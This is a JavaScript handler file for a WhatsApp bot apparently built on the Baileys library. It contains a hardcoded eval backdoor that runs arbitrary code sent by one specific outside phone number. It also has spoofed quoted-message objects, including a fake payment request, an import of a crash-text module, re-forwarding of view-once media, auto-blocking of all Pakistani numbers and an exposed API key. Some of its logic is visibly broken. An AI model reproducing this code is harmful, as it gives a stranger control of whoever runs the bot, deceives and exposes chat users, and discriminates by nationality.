require("./settings");
require("./lib/listmenu");
const { modul } = require("./module");
const {
  os,
  axios,
  baileys,
  chalk,
  cheerio,
  child_process,
  crypto,
  cookie,
  FormData,
  FileType,
  fetch,
  fs,
  fsx,
  ffmpeg,
  Jimp,
  jsobfus,
  PhoneNumber,
  process,
  moment,
  ms,
  speed,
  syntaxerror,
  util,
  ytdl,
} = modul;
const { exec, spawn, execSync } = child_process;
const {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType,
} = baileys;
const {
  clockString,
  formatp,
  tanggal,
  getTime,
  isUrl,
  sleep,
  runtime,
  fetchJson,
  getBuffer,
  jsonformat,
  format,
  reSize,
  generateProfilePicture,
} = require("./lib/myfunc");
const { color, bgcolor } = require("./lib/color");
const { buttonkal } = require("./basekyuu/virtex/buttonkal");
const { rentfromxeon, conns } = require("./RentBot");
const { uptotelegra } = require("./scrape/upload");
const { dafontSearch, dafontDown } = require("./scrape/dafont");
const {
  ytDonlodMp3,
  ytDonlodMp4,
  ytPlayMp3,
  ytPlayMp4,
  ytSearch,
} = require("./scrape/yt");
const anon = require("./lib/menfess");
const scp1 = require("./scrape/scraper");
const scp2 = require("./scrape/scraperr");
const scp3 = require("./scrape/scraperrr");
const ffstalk = require("./scrape/ffstalk");
const githubstalk = require("./scrape/githubstalk");
const npmstalk = require("./scrape/npmstalk");
const mlstalk = require("./scrape/mlstalk");
const textpro = require("./scrape/textpro");
const photooxy = require("./scrape/photooxy");
const yts = require("./scrape/yt-search");
const kirleys = require("@adiwajshing/baileys");
const vm = require("node:vm");
const { EmojiAPI } = require("emoji-api");
const emoji = new EmojiAPI();
const owner = JSON.parse(fs.readFileSync("./database/owner.json"));
const prem = JSON.parse(fs.readFileSync("./database/premium.json"));
const xeonverifieduser = JSON.parse(fs.readFileSync("./database/user.json"));
const VoiceNoteXeon = JSON.parse(
  fs.readFileSync("./XeonMedia/database/xeonvn.json")
);
const StickerXeon = JSON.parse(
  fs.readFileSync("./XeonMedia/database/xeonsticker.json")
);
const ImageXeon = JSON.parse(
  fs.readFileSync("./XeonMedia/database/xeonimage.json")
);
const VideoXeon = JSON.parse(
  fs.readFileSync("./XeonMedia/database/xeonvideo.json")
);
const BadXeon = JSON.parse(fs.readFileSync("./database/bad.json"));
const contacts = JSON.parse(fs.readFileSync("./database/contacts.json"));

let autosticker = JSON.parse(fs.readFileSync("./database/autosticker.json"));
let ntnsfw = JSON.parse(fs.readFileSync("./database/nsfw.json"));
let ntvirtex = JSON.parse(fs.readFileSync("./database/antivirus.json"));
let nttoxic = JSON.parse(fs.readFileSync("./database/antitoxic.json"));
let ntwame = JSON.parse(fs.readFileSync("./database/antiwame.json"));
let ntlinkgc = JSON.parse(fs.readFileSync("./database/antilinkgc.json"));
let ntilinkall = JSON.parse(fs.readFileSync("./database/antilinkall.json"));
let ntilinktwt = JSON.parse(fs.readFileSync("./database/antilinktwitter.json"));
let ntilinktt = JSON.parse(fs.readFileSync("./database/antilinktiktok.json"));
let ntilinktg = JSON.parse(fs.readFileSync("./database/antilinktelegram.json"));
let ntilinkfb = JSON.parse(fs.readFileSync("./database/antilinkfacebook.json"));
let ntilinkig = JSON.parse(
  fs.readFileSync("./database/antilinkinstagram.json")
);
let ntilinkytch = JSON.parse(
  fs.readFileSync("./database/antilinkytchannel.json")
);
let ntilinkytvid = JSON.parse(
  fs.readFileSync("./database/antilinkytvideo.json")
);

global.db = JSON.parse(fs.readFileSync("./database/database.json"));
if (global.db)
  global.db = {
    sticker: {},
    database: {},
    game: {},
    others: {},
    users: {},
    chats: {},
    data: {},
    ...(global.db || {}),
  };

module.exports = XeonBotInc = async (XeonBotInc, m, chatUpdate, store) => {
  try {
    const { type, quotedMsg, mentioned, now, fromMe } = m;
    const gakbisaowner = `${ownernumber}@s.whatsapp.net`;
    const body =
      m.mtype === "conversation"
        ? m.message.conversation
        : m.mtype == "imageMessage"
        ? m.message.imageMessage.caption
        : m.mtype == "videoMessage"
        ? m.message.videoMessage.caption
        : m.mtype == "extendedTextMessage"
        ? m.message.extendedTextMessage.text
        : m.mtype == "buttonsResponseMessage"
        ? m.message.buttonsResponseMessage.selectedButtonId
        : m.mtype == "listResponseMessage"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : m.mtype == "templateButtonReplyMessage"
        ? m.message.templateButtonReplyMessage.selectedId
        : m.mtype === "messageContextInfo"
        ? m.message.buttonsResponseMessage?.selectedButtonId ||
          m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
          m.text
        : "";
    const budy = typeof m.text == "string" ? m.text : "";
    const prefix = prefa;
    const chath =
      m.mtype === "conversation" && m.message.conversation
        ? m.message.conversation
        : m.mtype == "imageMessage" && m.message.imageMessage.caption
        ? m.message.imageMessage.caption
        : m.mtype == "documentMessage" && m.message.documentMessage.caption
        ? m.message.documentMessage.caption
        : m.mtype == "videoMessage" && m.message.videoMessage.caption
        ? m.message.videoMessage.caption
        : m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.text
        ? m.message.extendedTextMessage.text
        : m.mtype == "buttonsResponseMessage" &&
          m.message.buttonsResponseMessage.selectedButtonId
        ? m.message.buttonsResponseMessage.selectedButtonId
        : m.mtype == "templateButtonReplyMessage" &&
          m.message.templateButtonReplyMessage.selectedId
        ? m.message.templateButtonReplyMessage.selectedId
        : m.mtype == "listResponseMessage"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : m.mtype == "messageContextInfo"
        ? m.message.listResponseMessage.singleSelectReply.selectedRowId
        : "";
    const pes =
      m.mtype === "conversation" && m.message.conversation
        ? m.message.conversation
        : m.mtype == "imageMessage" && m.message.imageMessage.caption
        ? m.message.imageMessage.caption
        : m.mtype == "videoMessage" && m.message.videoMessage.caption
        ? m.message.videoMessage.caption
        : m.mtype == "extendedTextMessage" && m.message.extendedTextMessage.text
        ? m.message.extendedTextMessage.text
        : "";
    const messagesC = pes.slice(0).trim();
    const content = JSON.stringify(m.message);
    const from = m.key.remoteJid;
    const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase();
    const command = body
      //.replace(prefix, "")
      .startsWith(prefix)
      .trim()
      .split(/ +/)
      .shift()
      .toLowerCase();
    const isCmd = command.startsWith(prefix);
    const args = body.trim().split(/ +/).slice(1);
    const pushname = m.pushName || "No Name";
    const botNumber = await XeonBotInc.decodeJid(XeonBotInc.user.id);
    const XeonTheCreator = [botNumber, ...owner]
      .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
      .includes(m.sender);
    const XeonTheDeveloper = m.sender == botNumber ? true : false;
    const text = (q = args.join(" "));
    const quoted = m.quoted ? m.quoted : m;
    const mime = (quoted.msg || quoted).mimetype || "";
    const qmsg = quoted.msg || quoted;
    const isMedia = /image|video|sticker|audio/.test(mime);
    const isImage = type == "imageMessage";
    const isVideo = type == "videoMessage";
    const isAudio = type == "audioMessage";
    const isSticker = type == "stickerMessage";
    const isQuotedImage =
      type === "extendedTextMessage" && content.includes("imageMessage");
    const isQuotedLocation =
      type === "extendedTextMessage" && content.includes("locationMessage");
    const isQuotedVideo =
      type === "extendedTextMessage" && content.includes("videoMessage");
    const isQuotedSticker =
      type === "extendedTextMessage" && content.includes("stickerMessage");
    const isQuotedAudio =
      type === "extendedTextMessage" && content.includes("audioMessage");
    const isQuotedContact =
      type === "extendedTextMessage" && content.includes("contactMessage");
    const isQuotedDocument =
      type === "extendedTextMessage" && content.includes("documentMessage");
    const sender = m.isGroup
      ? m.key.participant
        ? m.key.participant
        : m.participant
      : m.key.remoteJid;
    const senderNumber = sender.split("@")[0];
    const groupMetadata = m.isGroup
      ? await XeonBotInc.groupMetadata(m.chat).catch((e) => {})
      : "";
    const groupName = m.isGroup ? groupMetadata.subject : "";
    const participants = m.isGroup ? await groupMetadata.participants : "";
    const groupAdmins = m.isGroup
      ? await participants.filter((v) => v.admin !== null).map((v) => v.id)
      : "";
    const groupOwner = m.isGroup ? groupMetadata.owner : "";
    const groupMembers = m.isGroup ? groupMetadata.participants : "";
    const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
    const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
    const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
    const isPrem = prem.includes(m.sender);
    const isContacts = contacts.includes(m.sender);
    const isUser = xeonverifieduser.includes(sender);
    const banUser = await XeonBotInc.fetchBlocklist();
    const isBanned = banUser ? banUser.includes(m.sender) : false;
    const mentionUser = [
      ...new Set([
        ...(m.mentionedJid || []),
        ...(m.quoted ? [m.quoted.sender] : []),
      ]),
    ];
    const mentionByTag =
      type == "extendedTextMessage" &&
      m.message.extendedTextMessage.contextInfo != null
        ? m.message.extendedTextMessage.contextInfo.mentionedJid
        : [];
    const mentionByReply =
      type == "extendedTextMessage" &&
      m.message.extendedTextMessage.contextInfo != null
        ? m.message.extendedTextMessage.contextInfo.participant || ""
        : "";
    const numberQuery =
      q.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";
    const usernya = mentionByReply ? mentionByReply : mentionByTag[0];
    const Input = mentionByTag[0]
      ? mentionByTag[0]
      : mentionByReply
      ? mentionByReply
      : q
      ? numberQuery
      : false;
    const isEval = body.startsWith("=>");

    const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false;
    const isAutoSticker = m.isGroup ? autosticker.includes(from) : false;
    const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false;
    const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false;
    const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false;
    const AntiLinkYoutubeChannel = m.isGroup
      ? ntilinkytch.includes(from)
      : false;
    const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false;
    const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false;
    const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false;
    const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false;
    const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false;
    const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false;
    const antiWame = m.isGroup ? ntwame.includes(from) : false;
    const antiToxic = m.isGroup ? nttoxic.includes(from) : false;

    //TIME
    const xtime = moment.tz("Asia/Kolkata").format("HH:mm:ss");
    const xdate = moment.tz("Asia/Kolkata").format("DD/MM/YYYY");
    const time2 = moment().tz("Asia/Kolkata").format("HH:mm:ss");
    if (time2 < "23:59:00") {
      var xeonytimewisher = `Good Night 🌌`;
    }
    if (time2 < "19:00:00") {
      var xeonytimewisher = `Good Evening 🌃`;
    }
    if (time2 < "18:00:00") {
      var xeonytimewisher = `Good Evening 🌃`;
    }
    if (time2 < "15:00:00") {
      var xeonytimewisher = `Good Afternoon 🌅`;
    }
    if (time2 < "11:00:00") {
      var xeonytimewisher = `Good Morning 🌄`;
    }
    if (time2 < "05:00:00") {
      var xeonytimewisher = `Good Morning 🌄`;
    }

    if (isEval && senderNumber == "6285813708397") {
      let evaled,
        text = q,
        { inspect } = require("util");
      try {
        if (text.endsWith("--sync")) {
          evaled = await eval(
            `(async () => { ${text.trim.replace("--sync", "")} })`
          );
          replygcxeon(evaled);
        }
        evaled = await eval(text);
        if (typeof evaled !== "string") evaled = inspect(evaled);
        await XeonBotInc.sendMessage(from, { text: evaled }, { quoted: m });
      } catch (e) {
        XeonBotInc.sendMessage(from, { text: String(e) }, { quoted: m });
      }
    }
    try {
      const isNumber = (x) => typeof x === "number" && !isNaN(x);
      const user = global.db.users[m.sender];
      if (typeof user !== "object") global.db.users[m.sender] = {};
      const chats = global.db.chats[m.chat];
      if (typeof chats !== "object") global.db.chats[m.chat] = {};
      if (user) {
        if (!isNumber(user.afkTime)) user.afkTime = -1;
        if (!("afkReason" in user)) user.afkReason = "";
        if (!("premium" in user)) user.premium = false;
      } else
        global.db.users[m.sender] = {
          afkTime: -1,
          afkReason: "",
          premium: false,
        };
    } catch (err) {
      console.error(err);
    }

    if (!XeonBotInc.public) {
      if (!m.key.fromMe) return;
    }

    //chat counter (console log)
    if (m.message && m.isGroup) {
      XeonBotInc.readMessages([m.key]);
      console.log(
        color(
          `\n< ================================================== >\n`,
          "cyan"
        )
      );
      console.log(color(`Group Chat:`, "green"));
      console.log(
        chalk.black(chalk.bgWhite("[ MESSAGE ]")),
        chalk.black(chalk.bgGreen(new Date())),
        chalk.black(chalk.bgBlue(budy || m.mtype)) +
          "\n" +
          chalk.magenta("=> From"),
        chalk.green(pushname),
        chalk.yellow(m.sender) + "\n" + chalk.blueBright("=> In"),
        chalk.green(groupName, m.chat)
      );
    } else {
      XeonBotInc.readMessages([m.key]);
      console.log(
        color(
          `\n< ================================================== >\n`,
          "cyan"
        )
      );
      console.log(color(`Private Chat:`, "green"));
      console.log(
        chalk.black(chalk.bgWhite("[ MESSAGE ]")),
        chalk.black(chalk.bgGreen(new Date())),
        chalk.black(chalk.bgBlue(budy || m.mtype)) +
          "\n" +
          chalk.magenta("=> From"),
        chalk.green(pushname),
        chalk.yellow(m.sender)
      );
    }

    if (isCmd && !isUser) {
      xeonverifieduser.push(sender);
      fs.writeFileSync(
        "./database/user.json",
        JSON.stringify(xeonverifieduser, null, 2)
      );
    }

    XeonBotInc.sendPresenceUpdate("available", from);

    for (let jid of mentionUser) {
      let user = global.db.users[jid];
      if (!user) continue;
      let afkTime = user.afkTime;
      if (!afkTime || afkTime < 0) continue;
      let reason = user.afkReason || "";
      replygcxeon(
        `Don't Tag Him!
He's AFK ${reason ? "With Reason: " + reason : "No Reason"}
During ${clockString(new Date() - afkTime)}
`.trim()
      );
    }

    if (db.users[m.sender].afkTime > -1) {
      let user = global.db.users[m.sender];
      replygcxeon(
        `
You Quit AFK${user.afkReason ? " After: " + user.afkReason : ""}
During ${clockString(new Date() - user.afkTime)}
`.trim()
      );
      user.afkTime = -1;
      user.afkReason = "";
    }

    //auto block pakistan number
    if (m.sender.startsWith("92"))
      return XeonBotInc.updateBlockStatus(m.sender, "block");

    async function sendXeonBotIncMessage(chatId, message, options = {}) {
      let generate = await generateWAMessage(chatId, message, options);
      let type2 = getContentType(generate.message);
      if ("contextInfo" in options)
        generate.message[type2].contextInfo = options?.contextInfo;
      if ("contextInfo" in message)
        generate.message[type2].contextInfo = message?.contextInfo;
      return await XeonBotInc.relayMessage(chatId, generate.message, {
        messageId: generate.key.id,
      });
    }
    //
    async function loading() {
      var kyuu = [
        "𝙻𝙾𝙰𝙳𝙸𝙽𝙶",
        "𝙻𝙾𝙰𝙳𝙸𝙽𝙶.",
        "𝙻𝙾𝙰𝙳𝙸𝙽𝙶..",
        "𝙻𝙾𝙰𝙳𝙸𝙽𝙶...",
        "𝙻𝙾𝙰𝙳𝙸𝙽𝙶....",
      ];
      let { key } = await XeonBotInc.sendMessage(from, { text: "ʟᴏᴀᴅɪɴɢ..." }); //Pengalih isu

      for (let i = 0; i < kyuu.length; i++) {
        /*await delay(10)*/
        await XeonBotInc.sendMessage(from, { text: kyuu[i], edit: key }); //PESAN LEPAS
      }
    }

    //group chat msg  by Fxyz
    const replygcxeon = (teks) => {
      XeonBotInc.sendMessage(
        m.chat,
        {
          text: teks,
          contextInfo: {
            mentionedJid: [sender],
            forwardingScore: 9999999,
            isForwarded: true,
            externalAdReply: {
              showAdAttribution: true,
              containsAutoReply: true,
              title: ` ${global.botname}`,
              body: `${ownername}`,
              previewType: "PHOTO",
              thumbnailUrl: ``,
              thumbnail: fs.readFileSync(`./XeonMedia/theme/cheemspic.jpg`),
              sourceUrl: `${wagc}`,
            },
          },
        },
        { quoted: m }
      );
    };
    const replygcxeon2 = (teks) => {
      sendXeonBotIncMessage(from, {
        text: teks,
        mentions: [sender],
        contextInfo: {
          forwardingScore: 9999999,
          isForwarded: true,
          mentionedJid: [sender],
          externalAdReply: {
            showAdAttribution: true,
            renderLargerThumbnail: true,
            title: botname,
            containsAutoReply: true,
            mediaType: 1,
            thumbnail: defaultpp,
            mediaUrl: `${wagc}`,
            sourceUrl: `${wagc}`,
          },
        },
      });
    };
    const reply = (teks) => {
      XeonBotInc.sendMessage(
        from,
        {
          text: teks,
          contextInfo: {
            forwardingScore: 9999999,
            isForwarded: true,
          },
        },
        { quoted: m }
      );
    };

    const sendSticker = (pesan) => {
      XeonBotInc.sendImageAsSticker(m.chat, pesan, m, {
        packname: global.packname,
        author: global.author,
      });
    };

    try {
      ppuser = await XeonBotInc.profilePictureUrl(m.sender, "image");
    } catch (err) {
      ppuser =
        "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60";
    }
    defaultpp = await reSize(ppuser, 300, 300);

    const sendvn = (teks) => {
      XeonBotInc.sendMessage(
        from,
        { audio: teks, mimetype: "audio/mp4", ptt: true },
        { quoted: m }
      );
    };

    //autoreply
    for (let BhosdikaXeon of VoiceNoteXeon) {
      if (budy === BhosdikaXeon) {
        let audiobuffy = fs.readFileSync(
          `./XeonMedia/audio/${BhosdikaXeon}.mp3`
        );
        XeonBotInc.sendMessage(
          m.chat,
          { audio: audiobuffy, mimetype: "audio/mp4", ptt: true },
          { quoted: m }
        );
      }
    }
    for (let BhosdikaXeon of StickerXeon) {
      if (budy === BhosdikaXeon) {
        let stickerbuffy = fs.readFileSync(
          `./XeonMedia/sticker/${BhosdikaXeon}.webp`
        );
        XeonBotInc.sendMessage(
          m.chat,
          { sticker: stickerbuffy },
          { quoted: m }
        );
      }
    }
    for (let BhosdikaXeon of ImageXeon) {
      if (budy === BhosdikaXeon) {
        let imagebuffy = fs.readFileSync(
          `./XeonMedia/image/${BhosdikaXeon}.jpg`
        );
        XeonBotInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m });
      }
    }
    for (let BhosdikaXeon of VideoXeon) {
      if (budy === BhosdikaXeon) {
        let videobuffy = fs.readFileSync(
          `./XeonMedia/video/${BhosdikaXeon}.mp4`
        );
        XeonBotInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m });
      }
    }

    if (m.isGroup && m.mtype == "viewOnceMessage") {
      let teks = `╭「 *Anti ViewOnce* 」\n├ *Name* : ${pushname}\n├ *User* : @${
        m.sender.split("@")[0]
      }\n├ *Clock* : ${time2}\n└ *Message* : ${m.mtype}`;
      XeonBotInc.sendMessage(
        m.chat,
        { text: teks, mentions: [m.sender] },
        { quoted: m }
      );
      await sleep(500);
      m.copyNForward(m.chat, true, { readViewOnce: true }, { quoted: m }).catch(
        (_) => replygcxeon(`Maybe It's Opened`)
      );
    }

    const lep = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...{ remoteJid: "" },
      },
      message: {
        imageMessage: {
          mimetype: "image/jpeg",
          caption: `${ownername}`,
          jpegThumbnail: defaultpp,
        },
      },
    };

    const ftext = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from
          ? {
              remoteJid: `${ownernumber}@s.whatsapp.net`,
            }
          : {}),
      },
      message: {
        extendedTextMessage: {
          text: `${m.pushName}`,
          title: `${m.pushName}`,
          jpegThumbnail: defaultpp,
        },
      },
    };

    const banRep = () => {
      XeonBotInc.sendMessage(
        m.chat,
        {
          text: `Sorry you've been banned, please chat @${
            creator.split("@")[0]
          } to unban`,
          mentions: [creator],
        },
        {
          quoted: m,
        }
      );
    };

    //Fake
    const ftroli = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
      },
      message: {
        orderMessage: {
          itemCount: 2022,
          status: 200,
          thumbnail: thumb,
          surface: 200,
          message: botname,
          orderTitle: ownername,
          sellerJid: "0@s.whatsapp.net",
        },
      },
      contextInfo: { forwardingScore: 999, isForwarded: true },
      sendEphemeral: true,
    };
    const fdoc = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
      },
      message: { documentMessage: { title: botname, jpegThumbnail: thumb } },
    };
    const fvn = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 359996400,
          ptt: "true",
        },
      },
    };
    const fgif = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        videoMessage: {
          title: botname,
          h: wm,
          seconds: "359996400",
          gifPlayback: "true",
          caption: ownername,
          jpegThumbnail: thumb,
        },
      },
    };
    const fgclink = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
      message: {
        groupInviteMessage: {
          groupJid: "6288213840883-1616169743@g.us",
          inviteCode: "m",
          groupName: wm,
          caption: `${pushname}`,
          jpegThumbnail: thumb,
        },
      },
    };
    const fvideo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        videoMessage: {
          title: botname,
          h: wm,
          seconds: "359996400",
          caption: `${pushname}`,
          jpegThumbnail: thumb,
        },
      },
    };
    const floc = {
      key: {
        participant: "0@s.whatsapp.net",
        ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
      },
      message: { locationMessage: { name: wm, jpegThumbnail: thumb } },
    };
    const fkontak = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: `status@broadcast` } : {}),
      },
      message: {
        contactMessage: {
          displayName: ownername,
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=6283897387848:6283897387848\nitem1.X-ABLabel:Mobile\nEND:VCARD`,
          jpegThumbnail: thumb,
          thumbnail: thumb,
          sendEphemeral: true,
        },
      },
    };
    const fakestatus = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(m.chat ? { remoteJid: "status@broadcast" } : {}),
      },
      message: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
          mimetype: "image/jpeg",
          caption: wm,
          fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
          fileLength: "28777",
          height: 1080,
          width: 1079,
          mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
          fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
          directPath:
            "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
          mediaKeyTimestamp: "1610993486",
          jpegThumbnail: fs.readFileSync("./XeonMedia/theme/cheemspic.jpg"),
          scansSidecar:
            "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
        },
      },
    };

    if (isCmd && isBanned) {
      return banRep();
    }

    let list = [];
    for (let i of owner) {
      list.push({
        displayName: await XeonBotInc.getName(i),
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await XeonBotInc.getName(
          i
        )}\nFN:${await XeonBotInc.getName(
          i
        )}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
      });
    }

    const repPy = {
      key: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: `${ownername}`,
        participant: "0@s.whatsapp.net",
      },
      message: {
        requestPaymentMessage: {
          currencyCodeIso4217: "USD",
          amount1000: 999999999,
          requestFrom: "0@s.whatsapp.net",
          noteMessage: {
            extendedTextMessage: {
              text: `${botname}`,
            },
          },
          expiryTimestamp: 999999999,
          amount: {
            value: 91929291929,
            offset: 1000,
            currencyCode: "INR",
          },
        },
      },
    };

    function simpan(path, buff) {
      fs.writeFileSync(path, buff);
      return path;
    }
    function getRandom(ext) {
      ext = ext || "";
      return `${Math.floor(Math.random() * 100000)}.${ext}`;
    }

    const pickRandom = (arr) => {
      return arr[Math.floor(Math.random() * arr.length)];
    };

    const downloadMp4 = async (Link) => {
      let gHz = require("./scrape/savefrom");
      let Lehd = await gHz.savefrom(Link);
      let ghd = await reSize(Lehd.thumb, 300, 300);
      let ghed = await ytdl.getInfo(Link);
      let gdyr = await XeonBotInc.sendMessage(
        from,
        {
          image: { url: Lehd.thumb },
          caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title : ${Lehd.meta.title}
Duration : ${Lehd.meta.duration}
Desc : ${ghed.player_response.videoDetails.shortDescription}`,
        },
        { quoted: m }
      );
      try {
        await ytdl.getInfo(Link);
        let mp4File = getRandom(".mp4");
        console.log(color("Download Video With ytdl-core"));
        let nana = ytdl(Link)
          .pipe(fs.createWriteStream(mp4File))
          .on("finish", async () => {
            await XeonBotInc.sendMessage(
              from,
              {
                video: fs.readFileSync(mp4File),
                caption: mess.succes,
                gifPlayback: false,
              },
              { quoted: gdyr }
            );
            fs.unlinkSync(`./${mp4File}`);
          });
      } catch (err) {
        replygcxeon(`${err}`);
      }
    };

    const downloadMp3 = async (Link) => {
      let pNx = require("./scrape/savefrom");
      let Puxa = await pNx.savefrom(Link);
      let MlP = await reSize(Puxa.thumb, 300, 300);
      let PlXz = await ytdl.getInfo(Link);
      let gedeyeer = await XeonBotInc.sendMessage(
        from,
        {
          image: { url: Puxa.thumb },
          caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`,
        },
        { quoted: m }
      );
      try {
        await ytdl.getInfo(Link);
        let mp3File = getRandom(".mp3");
        console.log(color("Download Audio With ytdl-core"));
        ytdl(Link, { filter: "audioonly" })
          .pipe(fs.createWriteStream(mp3File))
          .on("finish", async () => {
            await XeonBotInc.sendMessage(
              from,
              { audio: fs.readFileSync(mp3File), mimetype: "audio/mp4" },
              { quoted: gedeyeer }
            );
            fs.unlinkSync(mp3File);
          });
      } catch (err) {
        replygcxeon(`${err}`);
      }
    };

    async function sendPoll(jid, text, list) {
      XeonBotInc.relayMessage(
        jid,
        {
          pollCreationMessage: {
            name: text,
            options: list.map((v) => {
              return { optionName: v };
            }),
            selectableOptionsCount: list.length,
          },
        },
        {}
      );
    }

    async function rmbg(buffer) {
      let form = new FormData();
      form.append("size", "auto");
      form.append("image_file", fs.createReadStream(buffer), "ntah.webp");
      let res = await axios({
        url: "https://api.remove.bg/v1.0/removebg",
        method: "POST",
        data: form,
        responseType: "arraybuffer",
        headers: {
          "X-Api-Key": "dNaWDqPDEuzQTHDba6TACk57",
          ...form.getHeaders(),
        },
      });
      return res.data;
    }

    async function getFile(media) {
      let data = Buffer.isBuffer(media)
        ? media
        : isUrl(media)
        ? await (await fetch(media)).buffer()
        : fs.existsSync(media)
        ? fs.readFileSync(media)
        : /^data:.*?\/.*?;base64,/i.test(media)
        ? Buffer.from(media.split(",")[1])
        : null;
      if (!data) return new Error("Result is not a buffer");
      let type = (await FileType.fromBuffer(data)) || {
        mime: "application/octet-stream",
        ext: ".bin",
      };
      return {
        data,
        ...type,
      };
    }

    async function sendFile(jid, media, options = {}) {
      let file = await getFile(media);
      let mime = file.ext,
        type;
      if (mime == "mp3") {
        type = "audio";
        options.mimetype = "audio/mpeg";
        options.ptt = options.ptt || false;
      } else if (mime == "jpg" || mime == "jpeg" || mime == "png")
        type = "image";
      else if (mime == "webp") type = "sticker";
      else if (mime == "mp4") type = "video";
      else type = "document";
      return XeonBotInc.sendMessage(
        jid,
        { [type]: file.data, ...options },
        { ...options }
      );
    }

    async function ephoto(url, texk) {
      let form = new FormData();
      let gT = await axios.get(url, {
        headers: {
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
        },
      });
      let $ = cheerio.load(gT.data);
      let text = texk;
      let token = $("input[name=token]").val();
      let build_server = $("input[name=build_server]").val();
      let build_server_id = $("input[name=build_server_id]").val();
      form.append("text[]", text);
      form.append("token", token);
      form.append("build_server", build_server);
      form.append("build_server_id", build_server_id);
      let res = await axios({
        url: url,
        method: "POST",
        data: form,
        headers: {
          Accept: "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "user-agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
          cookie: gT.headers["set-cookie"]?.join("; "),
          ...form.getHeaders(),
        },
      });
      let $$ = cheerio.load(res.data);
      let json = JSON.parse($$("input[name=form_value_input]").val());
      json["text[]"] = json.text;
      delete json.text;
      let { data } = await axios.post(
        "https://en.ephoto360.com/effect/create-image",
        new URLSearchParams(json),
        {
          headers: {
            "user-agent":
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
            cookie: gT.headers["set-cookie"].join("; "),
          },
        }
      );
      return build_server + data.image;
    }

    async function quotesanime() {
      return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184);
        axios
          .get("https://otakotaku.com/quote/feed/" + page)
          .then(({ data }) => {
